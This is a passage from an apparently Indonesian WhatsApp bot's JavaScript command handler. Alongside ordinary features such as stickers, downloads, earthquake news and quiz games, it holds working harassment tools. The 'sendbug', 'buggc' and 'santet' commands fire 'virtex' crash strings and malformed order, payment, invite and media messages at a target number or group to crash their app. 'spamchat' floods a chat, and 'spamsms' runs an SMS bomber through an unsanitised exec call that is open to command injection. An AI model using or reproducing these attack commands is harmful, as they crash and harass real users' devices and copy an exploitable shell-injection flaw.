           let tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break

case  'buggc':
try{
if(!isOwner) return onlyOwner()
let Pe = q 
console.log(Pe)
if(!Pe ) return setReply("Masukan idgc target")
if(Pe == Ownerin) return setReply("SendBug Gagal")
await setReply(`Sending bug, waktu selesai 20 detik`)
let a = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
for (let i = 0; i < 10; i++) {
await sleep(2000)
console.log("sending")
await xdev.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: a });
await xdev.sendMessage(Pe, { text: `turu kau dek` }, { quoted: bugkontak });
await xdev.sendMessage(Pe, { text: `turu kau dek` }, { quoted: bugkontak });
await xdev.sendMessage(Pe, { text: "turu dek dek" }, { quoted: lep });
}
setReply(`Berhasil mengirim Bug ke ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break


case 'linkgc':
if (!isBotGroupAdmins) return setReply(mess.only.badmin)
conn.sendPresenceUpdate('composing', m.chat)
conn.sendMessage(m.chat, {
  text: 'Here The Link This Group',
  templateButtons: [{
    index: 1,
    urlButton: {
      displayText: `Salin Link`,
      url: 'https://www.whatsapp.com/otp/copy/https://chat.whatsapp.com/' + await conn.groupInviteCode(m.chat)
    }
  }],
  footer: "Alvaro Botz"
})
break



  

case  'sendbugv2':
try{
if (!isOwner && !dev.key.fromMe) return setReply(mess.only.Owner) 
if (!Input ) return setReply("Masukan nomer target")
if (Input == Ownerin) return setReply("Tidak bisa, karena itu nomer developer")
await setReply("Sending...")
await xdev.sendMessage(Input, { text: virtexbytsukasa }, {quoted: bugfc})                
await xdev.sendMessage(Input, { text: virtex1 }, {quoted: bugfc})            
await xdev.sendMessage(Input, { text: virtex2 }, {quoted: bugfc})       
await xdev.sendMessage(Input, { text: virtex3 }, {quoted: bugfc})    
await xdev.sendMessage(Input, { text: virtex4 }, {quoted: bugfc})              
await xdev.sendMessage(Input, { text: virtex5 }, {quoted: bugfc})     
await xdev.sendMessage(Input, { text: virtex6 }, {quoted: bugfc})
await xdev.sendMessage(Input, { text: virtex7 }, {quoted: bugfc})   
await xdev.sendMessage(Input, { text: virtex8 }, {quoted: bugfc})            
await xdev.sendMessage(Input, { text: virtex9 }, {quoted: bugfc})       
await xdev.sendMessage(Input, { text: virtex10 }, {quoted: bugfc})
await xdev.sendMessage(Input, { text: virtex11 }, {quoted: bugfc})              
await xdev.sendMessage(Input, { text: virtex12 }, {quoted: bugfc})     
await xdev.sendMessage(Input, { text: philip }, {quoted: bugfc})
await xdev.sendMessage(Input, { text: slayer }, {quoted: bugfc}) 
await xdev.sendMessage(Input, { text: ngazap }, {quoted: bugfc})
await xdev.sendMessage(Input, { text: ngazapv1 }, {quoted: bugfc})
await xdev.sendMessage(Input, { text: ngazapv2 }, {quoted: bugfc})
await xdev.sendMessage(Input, { text: ngazapv3 }, {quoted: bugfc})
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break

    case 'sendbugsantetgc':
                case 'sendbugsantedgc':
                case 'santetgc':
                case 'santedgc':
try {
if (!isOwner && !dev.key.fromMe) return onlyOwner()
if (!q) return setReply('id gc?')
if (!isGroup && q) {                    
require('../lib/index1.js')(xdev, dev, q, prefix, pushname, sender, isOwner, from, fake)
} else if (isGroup && !q) {
require('../lib/index1.js')(xdev, dev, q, prefix, pushname, sender, isOwner, from, fake)
} else if (q.split("|")[0] && q.split("|")[1] && q.split("|")[2]) {
require('../lib/santedGc.js')(xdev, bugkontak, setReply, q, delay)                                       
}
} catch (err) {
console.log(err)
setReply(`${err}`)
}
break

case  'santet':
case 'santed':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
if (mentionByReply) {
require('../lib/indexByReply1.js')(xdev, m, mentionByReply, prefix, pushname, sender, isOwner, from, fake)
} else if (mentionByTag[0] && isGroup) {
require('../lib/indexByTag1.js')(xdev, m, mentionByTag, prefix, pushname, sender, isOwner, from, fake)
} else if (q.split("|")[0] && !q.split("|")[2]) {
require('../lib/indexByNumber1.js')(xdev, m, q, prefix, pushname, sender, isOwner, from, fake)
} else if (q.split("|")[0] && q.split("|")[1] && q.split("|")[2]) {
require('../lib/santed1.js')(xdev, setReply, q, sleep)
}
} catch (err) {
console.log(err)
setReply(`${err}`)
}
break




case  'ttp':{
await fs.writeFileSync('out.png', text2png(q, {font: '80px Futura',
  color: 'white',
  textAlign: "left",
  lineSpacing: 10,
  padding: 20}))
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = fs.readFileSync('out.png')
let jancok = new Sticker(media, {
    pack: packName, // The pack name
    author: authorName, // The author name
    type: StickerTypes.FULL, // The sticker type
    categories: ['🤩', '🎉'], // The sticker category
    id: '12345', // The sticker id
    quality: 70, // The quality of the output file
    background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
await fs.unlinkSync('out.png')
}
break

case 'get':{
if (!args[0])  return reply ('link fotonya mana tuan')
xdev.sendMessage(from, {image: {url: args[0]},caption: `done kak`}, {quoted: dev})
}
break 


    
case 'twitterdl': {

	if (!q) return reply ('Linknya?')

reply (mess.wait)

let results = await twitterdlv2(q)

for (const { url } of results) await  xdev.sendMessage(from,{video: {url:url}, caption: "*TWITTER DOWNLOAD*"})
console.log(results)}
break

case 'readmore':
			    	case 'more':{    	
				    if (!q.includes('|')) return  setReply("Penggunaan teks| teks")
                    const text1 = q.substring(0, q.indexOf('|') - 0)
                    const text2 = q.substring(q.lastIndexOf('|') + 1)
                    setReply( text1 + readmore + text2)
                    }
                    break

case 'listblock':{
let block = await conn.fetchBlocklist()            
setReply('List Block:\n\n' + `Total: ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`)
}
break

case  'spamchat' :{
if (!isOwner) return onlyOwner()
if (!q) return reply('Masukan Teks yang akan dispam!')
let pesan = `${q}`
    await m.reply('Spam Dimulai\n\nNote : Botz spam 20 kali')
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
    await m.reply(pesan)
setReply(m.chat, 'Akhir Dari Spam', dev)
}
break

case 'spamsms':{
	     if(text.includes("@")) {
                    exec("python3 mpl.py "+text.split("@62")[1], (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                    } else if(text.startsWith("8")) {
                    	exec("python3 mpl.py "+text, (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                    	} else {
                    	m.reply(`Masukkan nomor contoh\n${prefix+command} 852**\natau\nTag nomor dengan cara\n${prefix+command} @mr_dark`)
                    	}
             }
    
case 'sendbugdelete':
                    try {
                        if (!isOwner) return setReply(mess.only.owner)
                        if (!Input) return setReply('Masukan nomer target')
                        if (Input == ownerNumber) return setReply('Tidak bisa, karena itu nomer developer')
                        let deleteMessage = xdev.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: dev.id, participant: '0️' } })
                        xdev.sendMessage(Input, { text: 'P' }, { quoted: deleteMessage })
                        setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
                    } catch (err) {
                        console.log(err)
                        setReply('Gagal mengirim bug, Terjadi Error')
                    }
                    break

case 'pptiktok':{
if (!q) return reply( '[❗INFO❗] Masukan Nama User Tiktok Yang Ingin Diambil Fotonya')
let res = `https://api.lolhuman.xyz/api/pptiktok/${args[0]}?apikey=${lolkey}`
conn.sendMessage(m.chat, res, 'error.jpg', `[ ✔ ] Sukses Mengambil Foto User ${text}`, dev, false)
}
break

case  'sendbugspam':
                    try {
                        if (!isOwner && !dev.key.fromMe) return onlyOwner()
                        if (!Input) return setReply('Masukan nomer target')
                        if (Input == ownerNumber) return setReply('Tidak bisa, karena itu nomer developer')
                        var bugreact = await xdev.sendMessage(from, { react: { text: '0️', key: { remoteJid: from, fromMe: true, id: dev.id } } })
                        var buginvite = generateWAMessageFromContent(
                            from,
                            {
                                groupInviteMessage: {
                                    groupJid: '6283144394823@g.us',
                                    inviteCode: 'UkJdqTXupAtmDwo4',
                                    inviteExpiration: '1643553084',
                                    invitetime: '1643293887000',
                                    groupName: virtex8,
                                    thumbnail: ofrply,
                                    caption: virtex8,
                                    contextInfo: { forwardingScore: 150, isForwarded: true },
                                },
                            },
                            { quoted: bugkontak }
                        )
                        var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({ requestPaymentMessage: { currencyCodeIso4217: 'IDR', amount1000: '100', noteMessage: { extendedTextMessage: { text: virtex8 } } } }), {
                            userJid: from,
                            quoted: bugkontak,
                        })
                        var pollCreation = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                pollCreationMessage: {
                                    name: 'HALO DEKK 🥶',
                                    options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],
                                    selectableOptionsCount: 5,
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: xdev.waUploadToServer })
                        var order = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                orderMessage: {
                                    orderId: '594071395007984',
                                    orderImage: messa.imageMessage,
                                    itemCount: 100000000000,
                                    status: 'INQUIRY',
                                    surface: 'CATALOG',
                                    message: virtex8,
                                    jpegThumbnail: ofrply,
                                    orderTitle: virtex8,
                                    sellerJid: '628979185922@s.whatsapp.net',
                                    token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',
                                    totalAmount1000: '500000000000000',
                                    totalCurrencyCode: 'IDR',
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var audio = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                audioMessage: {
                                    url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',
                                    mimetype: 'audio/mpeg',
                                    fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',
                                    fileLength: '258330',
                                    seconds: 16,
                                    ptt: false,
                                    mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',
                                    fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',
                                    directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',
                                    mediaKeyTimestamp: '1657190832',
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var image = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                imageMessage: {
                                    url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',
                                    mimetype: 'image/jpeg',
                                    caption: virtex8,
                                    fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',
                                    fileLength: '42521',
                                    height: 426,
                                    width: 640,
                                    mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',
                                    fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',
                                    directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',
                                    mediaKeyTimestamp: '1657286523',
                                    jpegThumbnail: messa.imageMessage,
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var document = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',
                                    mimetype: 'application/octet-stream',
                                    title: '.dev',
                                    fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',
                                    pageCount: 0,
                                    mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',
                                    fileName: virtex8,
                                    fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',
                                    directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',
                                    mediaKeyTimestamp: '1657288637',
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var sticker = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                stickerMessage: {
                                    url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',
                                    fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',
                                    fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',
                                    mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',
                                    mimetype: 'image/webp',
                                    height: 64,
                                    width: 64,
                                    directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',
                                    fileLength: '7774',
                                    mediaKeyTimestamp: '1657290167',
                                    isAnimated: false,
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var liveLocation = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: virtex8, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),
                            { userJid: from, quoted: bugkontak }
                        )
                        const buttons = [
                            { buttonId: 'FFFFFFF', buttonText: { displayText: ngazapv1 }, type: 1 },
                            { buttonId: 'FFFFFFF', buttonText: { displayText: ngazapv2 }, type: 1 },
                            { buttonId: 'FFFFFFF', buttonText: { displayText: ngazapv3 }, type: 1 },
                        ]
                        xdev.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id })
                        xdev.relayMessage(Input, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
                        xdev.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
                        xdev.relayMessage(Input, order.message, { messageId: order.key.id })
                        xdev.relayMessage(Input, audio.message, { messageId: audio.key.id })
                        xdev.relayMessage(Input, image.message, { messageId: image.key.id })
                        xdev.relayMessage(Input, document.message, { messageId: document.key.id })
                        xdev.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
                        xdev.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
                        xdev.sendButMessage(Input, `TURU DEKK 🥶`, fake, buttons, bugkontak)
                        xdev.sendKatalog(Input, virtex8, virtex8, ofrply, { quoted: bugkontak })
                        setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
                    } catch (err) {
                        console.log(err)
                        setReply('Gagal mengirim bug, Terjadi Error')
                    }
                    break

case  'sendbugspamv':
                    try {
                        if (!isOwner && !dev.key.fromMe) return onlyOwner()
                        if (!Input) return setReply('Masukan nomer target')
                        if (Input == ownerNumber) return setReply('Tidak bisa, karena itu nomer developer')
                        var bugreact = await xdev.sendMessage(from, { react: { text: '0️', key: { remoteJid: from, fromMe: true, id: dev.id } } })
                        var buginvite = generateWAMessageFromContent(
                            from,
                            {
                                groupInviteMessage: {
                                    groupJid: '6283144394823@g.us',
                                    inviteCode: 'UkJdqTXupAtmDwo4',
                                    inviteExpiration: '1643553084',
                                    invitetime: '1643293887000',
                                    groupName: virtex8,
                                    thumbnail: ofrply,
                                    caption: virtex8,
                                    contextInfo: { forwardingScore: 150, isForwarded: true },
                                },
                            },
                            { quoted: bugkontak }
                        )
                        var requestPaymentMessage = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({ requestPaymentMessage: { currencyCodeIso4217: 'IDR', amount1000: 'KENJI BERULAH 🗿', noteMessage: { extendedTextMessage: { jpegThumbnail: ofrply, text: virtex8 } } } }),
                            { userJid: from, quoted: dev }
                        )
                        var pollCreation = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                pollCreationMessage: {
                                    name: 'HALO DEKK 🥶',
                                    options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],
                                    selectableOptionsCount: 5,
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: xdev.waUploadToServer })
                        var order = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                orderMessage: {
                                    orderId: '594071395007984',
                                    orderImage: messa.imageMessage,
                                    itemCount: 100000000000,
                                    status: 'INQUIRY',
                                    surface: 'CATALOG',
                                    message: virtex8,
                                    jpegThumbnail: ofrply,
                                    orderTitle: virtex8,
                                    sellerJid: '628979185922@s.whatsapp.net',
                                    token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',
                                    totalAmount1000: '500000000000000',
                                    totalCurrencyCode: 'IDR',
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var audio = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                audioMessage: {
                                    url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',
                                    mimetype: 'audio/mpeg',
                                    fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',
                                    fileLength: '258330',
                                    seconds: 16,
                                    ptt: false,
                                    mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',
                                    fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',
                                    directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',
                                    mediaKeyTimestamp: '1657190832',
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var image = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                imageMessage: {
                                    url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',
                                    mimetype: 'image/jpeg',
                                    caption: virtex8,
                                    fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',
                                    fileLength: '42521',
                                    height: 426,
                                    width: 640,
                                    mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',
                                    fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',
                                    directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',
                                    mediaKeyTimestamp: '1657286523',
                                    jpegThumbnail: messa.imageMessage,
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var document = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',
                                    mimetype: 'application/octet-stream',
                                    title: '.dev',
                                    fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',
                                    pageCount: 0,
                                    mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',
                                    fileName: virtex8,
                                    fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',
                                    directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',
                                    mediaKeyTimestamp: '1657288637',
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var sticker = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({
                                stickerMessage: {
                                    url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',
                                    fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',
                                    fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',
                                    mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',
                                    mimetype: 'image/webp',
                                    height: 64,
                                    width: 64,
                                    directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',
                                    fileLength: '7774',
                                    mediaKeyTimestamp: '1657290167',
                                    isAnimated: false,
                                },
                            }),
                            { userJid: from, quoted: bugkontak }
                        )
                        var liveLocation = generateWAMessageFromContent(
                            from,
                            proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: virtex8, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),
                            { userJid: from, quoted: bugkontak }
                        )
                        const buttons = [
                            { buttonId: 'FFFFFFF', buttonText: { displayText: ngazapv1 }, type: 1 },
                            { buttonId: 'FFFFFFF', buttonText: { displayText: ngazapv2 }, type: 1 },
                            { buttonId: 'FFFFFFF', buttonText: { displayText: ngazapv3 }, type: 1 },
                        ]
                        if (mentionByReply) {
                            await setReply('Sending...')
                            for (let i = 0; i < args[0]; i++) {
                                xdev.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id })
                                xdev.relayMessage(Input, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
                                xdev.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
                                xdev.relayMessage(Input, order.message, { messageId: order.key.id })
                                xdev.relayMessage(Input, audio.message, { messageId: audio.key.id })
                                xdev.relayMessage(Input, image.message, { messageId: image.key.id })
                                xdev.relayMessage(Input, document.message, { messageId: document.key.id })
                                xdev.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
                                xdev.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
                                xdev.sendButMessage(Input, `TURU DEKK 🥶`, fake, buttons, bugkontak)
                                xdev.sendKatalog(Input, virtex8, virtex8, ofrply, { quoted: bugkontak })
                            }
                        } else if ((mentionByTag && isGroup && args[1]) || (!isGroup && args[1])) {
                            await setReply('Sending...')
                            for (let i = 0; i < args[1]; i++) {
                                xdev.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id })
                                xdev.relayMessage(Input, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
                                xdev.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
                                xdev.relayMessage(Input, order.message, { messageId: order.key.id })
                                xdev.relayMessage(Input, audio.message, { messageId: audio.key.id })
                                xdev.relayMessage(Input, image.message, { messageId: image.key.id })
                                xdev.relayMessage(Input, document.message, { messageId: document.key.id })
                                xdev.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
                                xdev.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
                                xdev.sendButMessage(Input, `TURU DEKK 🥶`, fake, buttons, bugkontak)
                                xdev.sendKatalog(Input, virtex8, virtex8, ofrply, { quoted: bugkontak })
                            }
                        }
                        setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
                    } catch (err) {
                        console.log(err)
                        setReply('Gagal mengirim bug, Terjadi Error')
                    }
                    break


case 'gempanow':{
let ano = await gempaNow()
console.log(ano)
if(ano.length == 0) return setReply("Tidak ada info terjadi gempa hari ini")
for(let e of ano){
let tks =`Lokasi: ${e.location}\nTanggal: ${e.date}\nKedalaman: ${e.depth}\nMagnitude: ${e.magnitude}\nLatitude: ${e.latitude}\nLongitude:${e.longitude}\n`
}
setReply(tks)
}
break


case 'infogempa':
    case 'gempa':{
let ani = await gempa()
console.log(ani)
tes =`*INFO GEMPA*\nTotal: ${ani.length}\n\n`
ani.map(function(e, i){
teks +=(i+1)+`. Lokasi: ${e.location}\nTanggal: ${e.date}\nKedalaman: ${e.depth}\nMagnitude: ${e.magnitude}\nPeringatan: ${e.warning}\n\n═════════════════\n\n`
 });
setReply(tes)
}
break

//game
case 'caklontong':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.caklontong) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `🎮 *Game Cak Lontong* 🎮

*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.caklontong[id] = [
await setReply(caption),
json,
setTimeout(() => {
if (conn.caklontong[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*\n${json.deskripsi}`)
delete conn.caklontong[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)
break
case 'tebakkata':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.tebakkata) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `🎮 *Game Tebak Kata* 🎮

*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.tebakkata[id] = [
await setReply(caption),
json,
setTimeout(() => {
if (conn.tebakkata[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*`)
delete conn.tebakkata[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)
break
case 'susunkata':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.susunkata) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `🎮 *Game Susun Kata* 🎮

*Soal :* ${json.soal}
*Tipe :* ${json.tipe}

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.susunkata[id] = [
await setReply(caption),
json,
setTimeout(() => {
if (conn.susunkata[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*`)
delete conn.susunkata[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)
break
case 'siapakahaku':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.siapakahaku) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `🎮 *Game Siapakah Aku* 🎮

*Soal :* ${json.soal}

